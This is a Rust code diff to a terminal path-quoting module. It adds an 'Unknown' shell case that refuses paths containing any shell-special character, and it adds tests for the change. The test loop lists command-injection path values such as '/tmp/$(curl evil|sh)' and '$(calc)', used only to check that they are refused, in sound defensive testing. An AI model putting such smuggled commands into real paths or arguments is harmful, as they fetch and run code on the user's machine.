@@ -19,20 +19,34 @@ pub enum Shell {
     PowerShell,
     Cmd,
     Posix,
+    /// No shell is named: nothing is quoted for a guess.
+    Unknown,
 }
 
-/// The shell named by shell integration (`Shell.shell`); an unknown or missing one reads like
-/// cmd.exe (Decision).
+/// The shell a reported name or path stands for (`/bin/zsh`, `C:\Windows\System32\cmd.exe`,
+/// `pwsh`). Anything else, and no report at all, is `Unknown`: it is never read as cmd.exe.
 pub fn shell_of(name: Option<&str>) -> Shell {
     let lower = name.unwrap_or_default().to_lowercase();
-    let stem = lower.trim_end_matches(".exe");
+    let base = lower.rsplit(['\\', '/']).next().unwrap_or_default();
+    let stem = base.trim_end_matches(".exe");
     if stem.contains("pwsh") || stem.contains("powershell") {
         Shell::PowerShell
     } else if matches!(stem, "bash" | "zsh" | "sh" | "fish" | "dash" | "ksh" | "tcsh" | "csh") {
         Shell::Posix
-    } else {
+    } else if stem == "cmd" {
         Shell::Cmd
+    } else {
+        Shell::Unknown
     }
+}
+
+/// What a refusal for an unnamed shell says.
+pub const UNKNOWN_REFUSED: &str = "Tandem did not write this path to the terminal: it holds a character some shells would read, and the shell is not known.";
+
+/// A character special in some supported shell: with no shell named, a path holding one is not
+/// quoted for a guess.
+fn special_in_some_shell(c: char) -> bool {
+    matches!(c, '$' | '`' | '\'' | '"' | '%' | '^' | '&' | '|' | '<' | '>' | ';' | '(' | ')' | '!' | '{' | '}' | '*' | '?' | '[' | ']' | '~' | '#' | '\u{2018}' | '\u{2019}' | '\u{201c}' | '\u{201d}')
 }
 
 /// What cmd.exe's refusal says.
@@ -62,6 +76,9 @@ pub fn quote_for(path: &str, shell: Shell) -> Result<String, String> {
         // a shell mistaken for it: such a path is not written.
         Shell::Cmd if path.chars().any(|c| matches!(c, '%' | '"' | '\u{201c}' | '\u{201d}' | '\u{ff02}')) => Err(CMD_REFUSED.to_string()),
         Shell::Cmd => Ok(format!("\"{path}\"")),
+        // Double quotes hold a plain path in every shell; anything special in any of them is refused.
+        Shell::Unknown if path.chars().any(special_in_some_shell) => Err(UNKNOWN_REFUSED.to_string()),
+        Shell::Unknown => Ok(format!("\"{path}\"")),
         Shell::Posix => {
             let mut out = String::new();
             for c in path.chars() {
@@ -88,8 +105,21 @@ mod tests {
         assert_eq!(shell_of(Some("zsh")), Shell::Posix);
         assert_eq!(shell_of(Some("fish")), Shell::Posix);
         assert_eq!(shell_of(Some("cmd")), Shell::Cmd);
-        assert_eq!(shell_of(None), Shell::Cmd);
-        assert_eq!(shell_of(Some("weird")), Shell::Cmd);
+    }
+
+
+    #[test]
+    fn an_unnamed_shell_is_not_guessed() {
+        assert_eq!(shell_of(None), Shell::Unknown);
+        assert_eq!(shell_of(Some("weird")), Shell::Unknown);
+        assert_eq!(shell_of(Some("/bin/zsh")), Shell::Posix);
+        assert_eq!(shell_of(Some("C:\\Windows\\System32\\cmd.exe")), Shell::Cmd);
+        assert_eq!(shell_of(Some("cmd")), Shell::Cmd);
+        for bad in ["C:\\x$(calc)", "C:\\x`calc`", "C:\\a\u{2019}b", "C:\\a\u{201c}b", "/tmp/$(curl evil|sh)", "C:\\a;b", "C:\\a&b", "C:\\100%", "C:\\a!b", "C:\\a'b", "C:\\a~b", "C:\\a#b", "a{b", "a*b", "a?b", "a[b", "a(b)", "a^b", "a<b", "a>b", "a|b"] {
+            assert!(quote_for(bad, Shell::Unknown).is_err(), "{bad}");
+        }
+        assert_eq!(quote_for(r"C:\a b", Shell::Unknown).unwrap(), "\"C:\\a b\"");
+        assert_eq!(quote_for(r"C:\a b", Shell::Cmd).unwrap(), "\"C:\\a b\"");
     }
 
     #[test]
